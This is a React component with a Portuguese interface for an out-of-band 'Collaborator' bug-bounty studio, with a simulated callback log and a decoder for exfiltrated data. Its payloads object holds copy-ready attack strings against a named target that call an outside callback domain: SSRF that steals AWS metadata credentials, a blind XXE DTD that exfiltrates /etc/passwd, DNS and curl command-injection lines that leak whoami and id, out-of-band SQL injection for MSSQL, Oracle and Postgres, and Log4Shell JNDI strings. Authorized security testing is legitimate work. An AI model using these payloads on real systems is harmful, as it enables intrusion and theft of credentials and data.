import React, { useState, useMemo } from 'react';
import { 
  Radio, 
  Terminal, 
  Copy, 
  Check, 
  Download, 
  RefreshCw, 
  Send, 
  ShieldAlert, 
  Globe, 
  Search, 
  Binary, 
  FileCode, 
  Layers, 
  Sparkles,
  CheckCircle2,
  AlertTriangle,
  ArrowRight,
  Database,
  Cloud,
  FileText
} from 'lucide-react';

interface OobInteraction {
  id: string;
  timestamp: string;
  protocol: 'DNS' | 'HTTP' | 'HTTPS' | 'LDAP' | 'SMB';
  sourceIp: string;
  subdomainOrPath: string;
  dataExfiltrated?: string;
  decodedData?: string;
  headers?: Record<string, string>;
}

export const OobInteractionStudio: React.FC = () => {
  const [tokenId, setTokenId] = useState<string>(() => `bb-${Math.random().toString(36).substring(2, 8)}`);
  const [copiedKey, setCopiedKey] = useState<string | null>(null);
  const [selectedCategory, setSelectedCategory] = useState<'ssrf' | 'xxe' | 'rce' | 'sqli' | 'jndi'>('ssrf');
  
  // Custom Decoder state
  const [encodedInput, setEncodedInput] = useState<string>('726f6f742d75736572');
  const [decoderMode, setDecoderMode] = useState<'hex-dns' | 'base64' | 'url'>('hex-dns');

  // Simulated live interaction logs
  const [interactions, setInteractions] = useState<OobInteraction[]>([
    {
      id: 'int-1',
      timestamp: '2026-09-22 13:42:10',
      protocol: 'DNS',
      sourceIp: '198.51.100.44',
      subdomainOrPath: `726f6f74.${tokenId}.bounty-oob.net`,
      dataExfiltrated: '726f6f74',
      decodedData: 'root (Hex decoded)'
    },
    {
      id: 'int-2',
      timestamp: '2026-09-22 13:42:14',
      protocol: 'HTTP',
      sourceIp: '198.51.100.44',
      subdomainOrPath: `/callback?token=${tokenId}&user=root&arch=x86_64`,
      headers: {
        'User-Agent': 'curl/7.88.1',
        'Host': `${tokenId}.bounty-oob.net`
      }
    }
  ]);

  const oobDomain = `${tokenId}.bounty-oob.net`;

  const regenerateToken = () => {
    const newToken = `bb-${Math.random().toString(36).substring(2, 8)}`;
    setTokenId(newToken);
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopiedKey(key);
    setTimeout(() => setCopiedKey(null), 2000);
  };

  // Trigger simulated callback
  const triggerSimulatedInteraction = (protocol: 'DNS' | 'HTTP' | 'LDAP') => {
    const now = new Date();
    const timeStr = now.toISOString().replace('T', ' ').substring(0, 19);

    let newInteraction: OobInteraction;
    if (protocol === 'DNS') {
      newInteraction = {
        id: `int-${Date.now()}`,
        timestamp: timeStr,
        protocol: 'DNS',
        sourceIp: '203.0.113.88',
        subdomainOrPath: `admin-host.${oobDomain}`,
        dataExfiltrated: 'admin-host',
        decodedData: 'admin-host'
      };
    } else if (protocol === 'LDAP') {
      newInteraction = {
        id: `int-${Date.now()}`,
        timestamp: timeStr,
        protocol: 'LDAP',
        sourceIp: '198.51.100.99',
        subdomainOrPath: `ldap://${oobDomain}:1389/ExploitObject`,
        headers: {
          'Java-Version': '11.0.14',
          'Caller': 'org.apache.logging.log4j.core.net.JndiManager'
        }
      };
    } else {
      newInteraction = {
        id: `int-${Date.now()}`,
        timestamp: timeStr,
        protocol: 'HTTP',
        sourceIp: '198.51.100.12',
        subdomainOrPath: `/exfil?leak=c3VjY2Vzc19hdXRoX3Rva2Vu`,
        dataExfiltrated: 'c3VjY2Vzc19hdXRoX3Rva2Vu',
        decodedData: 'success_auth_token (Base64 decoded)',
        headers: {
          'User-Agent': 'Python-urllib/3.10',
          'Accept': '*/*'
        }
      };
    }

    setInteractions(prev => [newInteraction, ...prev]);
  };

  // Decoder calculation
  const decodedResult = useMemo(() => {
    const input = encodedInput.trim();
    if (!input) return '';
    try {
      if (decoderMode === 'hex-dns') {
        let clean = input.replace(/[^0-9a-fA-F]/g, '');
        let str = '';
        for (let i = 0; i < clean.length; i += 2) {
          str += String.fromCharCode(parseInt(clean.substr(i, 2), 16));
        }
        return str || 'Entrada hexadecimal inválida';
      }
      if (decoderMode === 'base64') {
        return atob(input);
      }
      if (decoderMode === 'url') {
        return decodeURIComponent(input);
      }
    } catch (e) {
      return 'Erro na decodificação: verifique o formato dos dados.';
    }
    return '';
  }, [encodedInput, decoderMode]);

  // Attack Payloads formatted with current token
  const payloads = useMemo(() => {
    return {
      ssrf: {
        title: 'Blind SSRF (Server-Side Request Forgery)',
        curl: `curl -i -X POST "https://api.alvo.com/v1/webhook/subscribe" \\
  -H "Content-Type: application/json" \\
  -d '{"webhook_url": "http://${oobDomain}/ssrf-callback"}'`,
        imds: `curl -i "https://api.alvo.com/preview?url=http://${oobDomain}/?leak=\$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)"`,
        note: 'Se o servidor interno efetuar uma requisição HTTP ou resolução DNS para o domínio, o callback confirmará que o endpoint é vulnerável a Blind SSRF.'
      },
      xxe: {
        title: 'Blind XXE (XML External Entity Out-of-Band)',
        dtd: `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "http://${oobDomain}/eval.dtd">
  %remote;
  %eval;
  %exfil;
]>
<root><data>test</data></root>`,
        evalDtd: `<!-- Conteúdo hospedado em http://${oobDomain}/eval.dtd -->
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://${oobDomain}/?x=%file;'>">`,
        note: 'Técnica de parâmetro externo: força o parser XML do backend a buscar o arquivo DTD e enviar o conteúdo do arquivo via query string HTTP.'
      },
      rce: {
        title: 'Blind OS Command Injection (DNS & HTTP Exfiltration)',
        linuxDns: `ping -c 1 \`whoami\`.${oobDomain}`,
        linuxCurl: `curl -s http://${oobDomain}/?leak=\$(id | base64 | tr -d '\\n')`,
        windowsDns: `for /f %i in ('whoami') do nslookup %i.${oobDomain}`,
        note: 'A exfiltração por DNS contorna regras rígidas de saída de firewall (Egress Filtering) onde todo o tráfego HTTP é bloqueado mas resoluções DNS na porta 53 são permitidas.'
      },
      sqli: {
        title: 'Blind SQL Injection Out-of-Band (OOB-SQLi)',
        mssql: `'; EXEC master..xp_dirtree '\\\\${oobDomain}\\a'--`,
        oracle: `' UNION SELECT UTL_INADDR.get_host_address('${oobDomain}') FROM dual--`,
        postgres: `'; COPY (SELECT '') to PROGRAM 'nslookup \`whoami\`.${oobDomain}'--`,
        note: 'Funções nativas de banco de dados que executam requisições SMB ou consultas DNS recursivas, provando a injeção SQL mesmo sem nenhuma resposta refletida.'
      },
      jndi: {
        title: 'Log4Shell & JNDI Injection',
        ldapPayload: `\${jndi:ldap://${oobDomain}:1389/ExploitObject}`,
        dnsPayload: `\${jndi:dns://${oobDomain}/test}`,
        nestedPayload: `\${jndi:ldap://\${sys:user.name}.${oobDomain}:1389/a}`,
        note: 'Dispara uma consulta remota de LDAP ou DNS através do motor JNDI vulnerável, enviando informações do ambiente embutidas no hostname.'
      }
    };
  }, [oobDomain]);

  return (
    <div className="space-y-6">
      {/* Header Banner */}
      <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-6 relative overflow-hidden">
        <div className="absolute -right-8 -bottom-8 w-60 h-60 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div className="space-y-1.5">
            <div className="flex items-center gap-2">
              <span className="px-2.5 py-0.5 rounded-full bg-cyan-500/15 border border-cyan-500/30 text-cyan-400 font-mono text-xs font-bold flex items-center gap-1.5">
                <Radio className="w-3.5 h-3.5" />
                <span>Out-of-Band (OOB) Interaction Studio</span>
              </span>
              <span className="text-zinc-500 text-xs">•</span>
              <span className="text-zinc-400 font-mono text-xs">Collaborator & Blind Exploit Suite</span>
            </div>
            <h2 className="text-2xl font-bold text-white tracking-tight flex items-center gap-2">
              Central de Interações Fora-de-Banda (OOB / Collaborator)
            </h2>
            <p className="text-xs sm:text-sm text-zinc-400 max-w-3xl leading-relaxed">
              Comprove vulnerabilidades cegas onde a resposta HTTP não é refletida (Blind SSRF, Blind XXE, Blind RCE, Blind SQLi e Log4Shell). Gere tokens de escuta em múltiplos protocolos (DNS, HTTP, LDAP), capture callbacks e decodifique dados exfiltrados.
            </p>
          </div>

          <div className="flex items-center gap-2 self-start md:self-auto shrink-0">
            <button
              type="button"
              onClick={regenerateToken}
              className="px-3 py-2 rounded-xl bg-[#1a1a24] hover:bg-[#252535] text-zinc-300 border border-[#262638] text-xs font-mono font-bold flex items-center gap-1.5 transition-all"
            >
              <RefreshCw className="w-3.5 h-3.5" />
              <span>Novo Token OOB</span>
            </button>
          </div>
        </div>
      </div>

      {/* Active Listener Token Card */}
      <div className="bg-[#151520] border border-[#222234] rounded-2xl p-5 flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div className="space-y-1">
          <span className="text-[11px] font-mono font-bold text-cyan-400 uppercase tracking-wider flex items-center gap-1.5">
            <Radio className="w-3.5 h-3.5 animate-pulse" />
            <span>Domínio Ativo de Escuta OOB (Unique Collaborator Host):</span>
          </span>
          <div className="flex items-center gap-3">
            <code className="text-base sm:text-lg font-mono font-bold text-white bg-[#0b0b10] px-3.5 py-1.5 rounded-xl border border-[#232336]">
              {oobDomain}
            </code>
            <button
              type="button"
              onClick={() => copyToClipboard(oobDomain, 'domain')}
              className="p-2 rounded-lg bg-[#20202e] hover:bg-[#2a2a3e] text-zinc-300 transition-all border border-[#2e2e42]"
              title="Copiar domínio"
            >
              {copiedKey === 'domain' ? <Check className="w-4 h-4 text-emerald-400" /> : <Copy className="w-4 h-4" />}
            </button>
          </div>
        </div>

        {/* Quick Protocol Endpoints */}
        <div className="flex flex-wrap items-center gap-2 text-[11px] font-mono text-zinc-400">
          <span className="bg-[#1b1b26] px-2.5 py-1 rounded-lg border border-[#28283a]">DNS: *.<strong>{oobDomain}</strong></span>
          <span className="bg-[#1b1b26] px-2.5 py-1 rounded-lg border border-[#28283a]">HTTP: http://<strong>{oobDomain}</strong></span>
          <span className="bg-[#1b1b26] px-2.5 py-1 rounded-lg border border-[#28283a]">LDAP: ldap://<strong>{oobDomain}</strong>:1389</span>
        </div>
      </div>

      {/* Two Column Layout: Attack Payloads (7 cols) + Live Interactions & Decoder (5 cols) */}
      <div className="grid grid-cols-1 lg:grid-cols-12 gap-6">
        {/* Left Column: Category selector and ready-to-use payloads */}
        <div className="lg:col-span-7 space-y-4">
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-4">
            {/* Category Navigation */}
            <div className="flex items-center gap-2 overflow-x-auto pb-1 scrollbar-none">
              <button
                type="button"
                onClick={() => setSelectedCategory('ssrf')}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 whitespace-nowrap ${
                  selectedCategory === 'ssrf' ? 'bg-cyan-500 text-black' : 'bg-[#181824] text-zinc-400 hover:text-white'
                }`}
              >
                <Cloud className="w-3.5 h-3.5" />
                <span>Blind SSRF</span>
              </button>
              <button
                type="button"
                onClick={() => setSelectedCategory('xxe')}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 whitespace-nowrap ${
                  selectedCategory === 'xxe' ? 'bg-cyan-500 text-black' : 'bg-[#181824] text-zinc-400 hover:text-white'
                }`}
              >
                <FileCode className="w-3.5 h-3.5" />
                <span>Blind XXE</span>
              </button>
              <button
                type="button"
                onClick={() => setSelectedCategory('rce')}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 whitespace-nowrap ${
                  selectedCategory === 'rce' ? 'bg-cyan-500 text-black' : 'bg-[#181824] text-zinc-400 hover:text-white'
                }`}
              >
                <Terminal className="w-3.5 h-3.5" />
                <span>Blind RCE (DNS Exfil)</span>
              </button>
              <button
                type="button"
                onClick={() => setSelectedCategory('sqli')}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 whitespace-nowrap ${
                  selectedCategory === 'sqli' ? 'bg-cyan-500 text-black' : 'bg-[#181824] text-zinc-400 hover:text-white'
                }`}
              >
                <Database className="w-3.5 h-3.5" />
                <span>OOB-SQLi</span>
              </button>
              <button
                type="button"
                onClick={() => setSelectedCategory('jndi')}
                className={`px-3 py-1.5 rounded-lg text-xs font-mono font-bold transition-all flex items-center gap-1.5 whitespace-nowrap ${
                  selectedCategory === 'jndi' ? 'bg-cyan-500 text-black' : 'bg-[#181824] text-zinc-400 hover:text-white'
                }`}
              >
                <Sparkles className="w-3.5 h-3.5" />
                <span>Log4Shell / JNDI</span>
              </button>
            </div>

            {/* Category Content */}
            {selectedCategory === 'ssrf' && (
              <div className="space-y-3">
                <div className="space-y-1">
                  <h4 className="text-sm font-bold text-white">{payloads.ssrf.title}</h4>
                  <p className="text-xs text-zinc-400">{payloads.ssrf.note}</p>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>1. Verificação Simples de Callback (Webhooks / Url Preview):</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.ssrf.curl, 'ssrf-curl')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'ssrf-curl' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.ssrf.curl}
                  </pre>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>2. Exfiltração de Metadados de Nuvem (AWS IMDSv1):</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.ssrf.imds, 'ssrf-imds')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'ssrf-imds' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.ssrf.imds}
                  </pre>
                </div>
              </div>
            )}

            {selectedCategory === 'xxe' && (
              <div className="space-y-3">
                <div className="space-y-1">
                  <h4 className="text-sm font-bold text-white">{payloads.xxe.title}</h4>
                  <p className="text-xs text-zinc-400">{payloads.xxe.note}</p>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>Payload XML Injetado no Alvo:</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.xxe.dtd, 'xxe-dtd')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'xxe-dtd' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.xxe.dtd}
                  </pre>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>Arquivo DTD Externo Hospedado no Collaborator:</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.xxe.evalDtd, 'xxe-eval')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'xxe-eval' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.xxe.evalDtd}
                  </pre>
                </div>
              </div>
            )}

            {selectedCategory === 'rce' && (
              <div className="space-y-3">
                <div className="space-y-1">
                  <h4 className="text-sm font-bold text-white">{payloads.rce.title}</h4>
                  <p className="text-xs text-zinc-400">{payloads.rce.note}</p>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>Linux — DNS Query com Exfiltração de Usuário:</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.rce.linuxDns, 'rce-linux-dns')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'rce-linux-dns' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.rce.linuxDns}
                  </pre>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>Linux — Exfiltração HTTP com Base64:</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.rce.linuxCurl, 'rce-curl')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'rce-curl' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.rce.linuxCurl}
                  </pre>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>Windows — Cmd / PowerShell DNS Exfiltração:</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.rce.windowsDns, 'rce-win-dns')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'rce-win-dns' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.rce.windowsDns}
                  </pre>
                </div>
              </div>
            )}

            {selectedCategory === 'sqli' && (
              <div className="space-y-3">
                <div className="space-y-1">
                  <h4 className="text-sm font-bold text-white">{payloads.sqli.title}</h4>
                  <p className="text-xs text-zinc-400">{payloads.sqli.note}</p>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>Microsoft SQL Server (xp_dirtree SMB/DNS trigger):</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.sqli.mssql, 'sqli-mssql')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'sqli-mssql' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.sqli.mssql}
                  </pre>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>Oracle Database (UTL_INADDR DNS trigger):</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.sqli.oracle, 'sqli-oracle')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'sqli-oracle' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.sqli.oracle}
                  </pre>
                </div>
              </div>
            )}

            {selectedCategory === 'jndi' && (
              <div className="space-y-3">
                <div className="space-y-1">
                  <h4 className="text-sm font-bold text-white">{payloads.jndi.title}</h4>
                  <p className="text-xs text-zinc-400">{payloads.jndi.note}</p>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>Payload JNDI LDAP Primário:</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.jndi.ldapPayload, 'jndi-ldap')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'jndi-ldap' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.jndi.ldapPayload}
                  </pre>
                </div>

                <div className="space-y-1.5">
                  <div className="flex items-center justify-between text-[11px] font-mono text-zinc-400">
                    <span>Exfiltração de Variável de Ambiente (user.name):</span>
                    <button
                      type="button"
                      onClick={() => copyToClipboard(payloads.jndi.nestedPayload, 'jndi-nested')}
                      className="hover:text-white flex items-center gap-1"
                    >
                      {copiedKey === 'jndi-nested' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-[11px] font-mono text-cyan-300 leading-relaxed overflow-x-auto">
                    {payloads.jndi.nestedPayload}
                  </pre>
                </div>
              </div>
            )}
          </div>
        </div>

        {/* Right Column: Interaction Logs & Data Decoder (5 cols) */}
        <div className="lg:col-span-5 space-y-5">
          {/* Real-time Interaction Feed */}
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3.5">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 animate-ping" />
                <h3 className="text-xs font-mono font-bold text-zinc-300 uppercase tracking-wider">
                  Log de Callbacks Capturados ({interactions.length})
                </h3>
              </div>

              {/* Simulate trigger buttons */}
              <div className="flex items-center gap-1">
                <button
                  type="button"
                  onClick={() => triggerSimulatedInteraction('DNS')}
                  className="px-2 py-0.5 rounded text-[10px] font-mono bg-cyan-950/60 hover:bg-cyan-900/80 text-cyan-300 border border-cyan-500/30"
                >
                  +DNS
                </button>
                <button
                  type="button"
                  onClick={() => triggerSimulatedInteraction('HTTP')}
                  className="px-2 py-0.5 rounded text-[10px] font-mono bg-emerald-950/60 hover:bg-emerald-900/80 text-emerald-300 border border-emerald-500/30"
                >
                  +HTTP
                </button>
                <button
                  type="button"
                  onClick={() => triggerSimulatedInteraction('LDAP')}
                  className="px-2 py-0.5 rounded text-[10px] font-mono bg-purple-950/60 hover:bg-purple-900/80 text-purple-300 border border-purple-500/30"
                >
                  +LDAP
                </button>
              </div>
            </div>

            <div className="space-y-2.5 max-h-[280px] overflow-y-auto pr-1">
              {interactions.map(item => (
                <div key={item.id} className="bg-[#161622] border border-[#232336] rounded-xl p-3 space-y-1.5 text-xs font-mono">
                  <div className="flex items-center justify-between">
                    <span className={`px-2 py-0.5 rounded text-[10px] font-bold border ${
                      item.protocol === 'DNS' ? 'bg-cyan-500/20 text-cyan-300 border-cyan-500/40' :
                      item.protocol === 'LDAP' ? 'bg-purple-500/20 text-purple-300 border-purple-500/40' :
                      'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
                    }`}>
                      {item.protocol}
                    </span>
                    <span className="text-[10px] text-zinc-500">{item.timestamp}</span>
                  </div>
                  <div className="text-white font-bold text-[11px] truncate">
                    {item.subdomainOrPath}
                  </div>
                  <div className="flex items-center justify-between text-[10px] text-zinc-400">
                    <span>Origem: {item.sourceIp}</span>
                    {item.decodedData && (
                      <span className="text-emerald-400 font-bold">{item.decodedData}</span>
                    )}
                  </div>
                </div>
              ))}
            </div>
          </div>

          {/* Exfiltrated Data Decoder */}
          <div className="bg-[#121218] border border-[#22222f] rounded-2xl p-5 space-y-3">
            <h3 className="text-xs font-mono font-bold text-zinc-300 uppercase tracking-wider flex items-center gap-2">
              <Binary className="w-4 h-4 text-cyan-400" />
              <span>Decodificador de Dados Exfiltrados</span>
            </h3>

            {/* Mode selection */}
            <div className="flex items-center gap-1.5 text-xs font-mono">
              <button
                type="button"
                onClick={() => setDecoderMode('hex-dns')}
                className={`px-2.5 py-1 rounded-lg transition-all ${
                  decoderMode === 'hex-dns' ? 'bg-cyan-500 text-black font-bold' : 'bg-[#181824] text-zinc-400'
                }`}
              >
                Hex Subdomain
              </button>
              <button
                type="button"
                onClick={() => setDecoderMode('base64')}
                className={`px-2.5 py-1 rounded-lg transition-all ${
                  decoderMode === 'base64' ? 'bg-cyan-500 text-black font-bold' : 'bg-[#181824] text-zinc-400'
                }`}
              >
                Base64
              </button>
              <button
                type="button"
                onClick={() => setDecoderMode('url')}
                className={`px-2.5 py-1 rounded-lg transition-all ${
                  decoderMode === 'url' ? 'bg-cyan-500 text-black font-bold' : 'bg-[#181824] text-zinc-400'
                }`}
              >
                URL Decode
              </button>
            </div>

            <div className="space-y-1">
              <label className="text-[11px] font-mono text-zinc-400">String Capturada:</label>
              <input
                type="text"
                value={encodedInput}
                onChange={(e) => setEncodedInput(e.target.value)}
                placeholder="Cole o hex ou base64 exfiltrado..."
                className="w-full bg-[#161622] border border-[#262638] rounded-xl px-3 py-1.5 text-xs text-white font-mono focus:outline-none focus:border-cyan-500"
              />
            </div>

            <div className="space-y-1 pt-1">
              <span className="text-[11px] font-mono text-zinc-400">Resultado Decodificado:</span>
              <pre className="bg-[#0b0b10] border border-[#1e1e28] rounded-xl p-3 text-xs font-mono text-emerald-400 leading-relaxed break-all">
                {decodedResult || '(Vazio)'}
              </pre>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
